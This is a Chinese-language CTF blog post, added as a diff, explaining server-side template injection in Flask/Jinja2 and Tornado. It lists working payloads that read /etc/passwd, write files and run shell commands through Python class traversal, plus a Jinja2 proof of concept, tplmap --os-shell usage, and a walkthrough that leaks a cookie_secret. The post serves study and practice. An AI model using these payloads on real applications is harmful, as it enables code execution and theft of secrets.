@@ -1,0 +1,196 @@
+---
+layout: post
+title:  SSTI
+date:   2021-07-23 00:01:01 +0300
+image:  2021-07-23-woman.jpg
+tags:   [ctf,web,SSTI]
+---
+
+ssti注入又称服务器端模板注入攻击(Server-Side Template Injection)，和sql注入一样，也是由于接受用户输入而造成的安全问题。
+
+它的实质就是服务器端接受了用户的输入，没有经过过滤或者说过滤不严谨，将用户输入作为web应用模板的一部分，但是在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露，代码执行，getshell等问题。
+
+这个问题主要是出在web应用模板渲染的过程中，目前比较流行的渲染引擎模板主要有：smarty，twig，jinja2，freemarker，velocity。
+
+flask有两种渲染方式，render_template() 和 render_template_string()。
+
+render_template()是渲染文件的，render_template_string是渲染字符串的，如果错误的使用render_template_string渲染方式的话，就会产生模板注入。
+
+在Jinja2模板引擎中，`{{}}`是变量包裹标识符。`{{}}`并不仅仅可以传递变量，还可以执行一些简单的表达式。
+
+实行文件读写和命令执行的基本操作：获取基本类->获取基本类的子类->在子类中找到关于命令执行和文件读写的模块
+
+python的几个函数解析：
+
+* \_\_class\_\_ 返回调用的参数类型
+* \_\_bases\_\_ 返回类型列表
+* \_\_mro\_\_ 此属性是在方法解析期间寻找基类时考虑的类元组
+* \_\_subclasses\_\_() 返回object的子类
+* \_\_globals\_\_ 函数会以字典类型返回当前位置的全部全局变量与func_globals 等价
+
+获取基本类(object)：
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2]
+* {}.\_\_class\_\_.\_\_bases\_\_[0]
+* ().\_\_class\_\_.\_\_bases\_\_[0]
+* [].\_\_class\_\_.\_\_bases\_\_[0]
+* request.\_\_class\_\_.\_\_mro\_\_[9]   //在flask的jinja2模块渲染是可用
+
+获取基本类的子类：
+
+* object.\_\_subclasses\_\_()
+* //''.\_\_class__.__mro\_\_[2].\_\_subclasses\_\_()
+* //...基于上面的其他写法
+
+快速查找该引用对应的位置：
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_().index(file)
+
+**文件读写：**
+
+在子类里面有<type 'file'>这个引用的索引，可以直接调用进行文件读写：
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[40]
+
+```assembly
+>>>''.__class__.__mro__[2].__subclasses__()[40]
+<type 'file'>
+```
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses__()\[40\]("/etc/passwd").read()
+
+将read()改为write()就可以进行写操作：
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses__()\[40\]("/root/Desktop/test.txt", "a").write()
+
+或者在基本类的子类中找到重载过的\_\_init\_\_类(在基本类的子类中的一些类属性基本都有引用)，查看引用\_\_builtins\_\_
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_init\_\_.\_\_globals\_\_['\_\_builtins\_\_']
+
+读取文件
+
+* ''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_init\_\_.\_\_globals\_\_\['\_\_builtins\_\_']\['file'\]("/etc/passwd").read()
+
+**命令执行：**
+
+方法一：利用eval进行命令执行
+
+```assembly
+''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
+```
+
+方法二：利用commands实现命令执行：
+
+```assembly
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')}
+{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()
+```
+
+在进行jinja2模板注入时，直接将这些payload放入{{}}中作为变量执行即可获得想要的结果，如果存在对应键不在相应位置，那么就需要我们从基本类开始找了，一般来说应该是一样的，这个需要看python环境.
+
+### [Flask]SSTI
+
+获取eval函数并执行任意python代码的POC：
+
+```assembly
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("id").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+```
+
+打印环境变量
+
+```assembly
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("env").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+```
+
+`Hello HOSTNAME=fd9e0b6fbf88 PYTHON_PIP_VERSION=19.3.1 HOME=/root GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py SERVER_SOFTWARE=gunicorn/20.0.0 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.6.9 PWD=/app PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee FLAG=flag{5f4fc78a-83b1-45be-b2cb-97dc582da1c0}`
+
+tplmap脚本
+
+```assembly
+python tplmap.py -u "http://node3.buuoj.cn:29153/?name=1"
+python tplmap.py -u "http://node3.buuoj.cn:29153/?name=1" --os-shell
+env打印环境变量
+>>>env
+```
+
+### [护网杯 2018]easy_tornado
+
+打开页面显示
+
+/flag.txt(/file?filename=/flag.txt&filehash=c1aa029a84dfff74f2b8cf5c8c9651c4)
+/welcome.txt(/file?filename=/welcome.txt&filehash=61643ca97971f3920d8d8a2f6349ce2a)
+/hints.txt(/file?filename=/hints.txt&filehash=f03979d2e893b7ff1e483e655e07e06e)
+
+* /flag.txt
+  flag in /fllllllllllllag
+
+* /welcome.txt
+  render
+
+* /hints.txt
+  md5(cookie_secret+md5(filename))
+
+render是生成模板的函数，想到模板注入STTI
+
+将filename=/flag.txt改为fllllllllllllag，报错
+
+### Error
+
+url为`http://46bdb449-ef6e-4b5d-8992-64c9b6135081.node4.buuoj.cn:81/error?msg=Error`
+
+在读取文件失败的这个链接中，发现STTI漏洞
+
+在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象
+
+- `escape`: alias for [`tornado.escape.xhtml_escape`](https://www.tornadoweb.org/en/latest/escape.html#tornado.escape.xhtml_escape)
+- `xhtml_escape`: alias for [`tornado.escape.xhtml_escape`](https://www.tornadoweb.org/en/latest/escape.html#tornado.escape.xhtml_escape)
+- `url_escape`: alias for [`tornado.escape.url_escape`](https://www.tornadoweb.org/en/latest/escape.html#tornado.escape.url_escape)
+- `json_encode`: alias for [`tornado.escape.json_encode`](https://www.tornadoweb.org/en/latest/escape.html#tornado.escape.json_encode)
+- `squeeze`: alias for [`tornado.escape.squeeze`](https://www.tornadoweb.org/en/latest/escape.html#tornado.escape.squeeze)
+- `linkify`: alias for [`tornado.escape.linkify`](https://www.tornadoweb.org/en/latest/escape.html#tornado.escape.linkify)
+- `datetime`: the Python [`datetime`](https://docs.python.org/3/library/datetime.html#module-datetime) module
+- `handler`: the current [`RequestHandler`](https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler) object
+- `request`: alias for [`handler.request`](https://www.tornadoweb.org/en/latest/httputil.html#tornado.httputil.HTTPServerRequest)
+- `current_user`: alias for [`handler.current_user`](https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler.current_user)
+- `locale`: alias for [`handler.locale`](https://www.tornadoweb.org/en/latest/locale.html#tornado.locale.Locale)
+- `_`: alias for [`handler.locale.translate`](https://www.tornadoweb.org/en/latest/locale.html#tornado.locale.Locale.translate)
+- `static_url`: alias for [`handler.static_url`](https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler.static_url)
+- `xsrf_form_html`: alias for [`handler.xsrf_form_html`](https://www.tornadoweb.org/en/latest/web.html#tornado.web.RequestHandler.xsrf_form_html)
+- `reverse_url`: alias for [`Application.reverse_url`](https://www.tornadoweb.org/en/latest/web.html#tornado.web.Application.reverse_url)
+
+Handler指向的处理当前这个页面的RequestHandler对象
+
+`error?msg={{handler.settings}}`
+
+得到cookie_secret
+
+{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '315452ec-ba55-443d-8aeb-083556f7414f'}
+
+构造payload
+
+`/file?filename=/fllllllllllllag&filehash=96c1fd70803f8c78098c9f2fc55af689`
+
+得到flag
+
+/fllllllllllllag
+flag{450f5e8e-d282-46bd-80aa-c2042681eb5d}
